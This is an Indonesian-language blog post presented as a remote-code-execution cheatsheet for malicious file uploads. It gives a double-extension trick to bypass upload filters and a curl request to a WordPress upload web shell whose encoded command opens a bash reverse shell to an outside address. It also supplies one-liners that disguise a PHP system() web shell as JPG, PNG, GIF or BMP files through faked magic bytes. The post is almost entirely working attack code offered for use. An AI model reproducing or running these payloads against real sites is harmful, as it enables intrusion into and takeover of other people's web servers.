---
layout: post
title: "Note: RCE cheatsheet"
date: 2022-12-09
---

Karena, saya rada kesusahan untuk mengumpulkan resource jika nanti googling-googling. Dan note yang saya pakai juga tidak lengkap referensinya, maka saya kumpulkan di sini. 

Jika ada malicious upload, maka yang seharusnya dilakukan adalah memanipulasi file extension atau memanipulasi isi dari file tersebut

Bisa juga, jika trik ini tidak berfungsi dengan benar, maka bisa dinjeksi dengan membuat ekstensi menjadi double
```sh
~$ mv shell.jpg shell.jpg.php
```
lalu coba aktifkan dengan curl
```sh
~$ curl -s "http://beloved/wp-content/uploads/2022/12/shell.jpg-1670590514.8364.php?cmd=echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTkuMS8xMjM0NSAwPiYxCg%3D%3D+%7C+base64+-d+%7C+bash"
```
Dan, tidak perlu repot repot untuk menggunakan <https://revshell.com> yang dibuat oleh 0day. Cukup buat string menjadi URL-encoded, dan eksekusi.
```python
~$ python -c 'import urllib.parse; string = "(isi string di sini)"; print(urllib.parse.quote_plus(string))'
```
Dengan format seperti ini, btw ini format favorit saya.
```sh
~$ echo (base64) | base64 -d | bash  
```

Sebelum masuk ke cheatsheet, jika anda penikmat POST Request bisa mengganti `$_GET` menjadi `$_POST`. LOL semua orang juga sudah tau ini.

## JPG
```shell
echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
```

## PNG
```shell
echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png
```

## GIF
```shell
echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif
```
## BMP
```shell
echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
```

Happy hacking!

## References
* https://twitter.com/0x0SojalSec/status/1599809897658724357
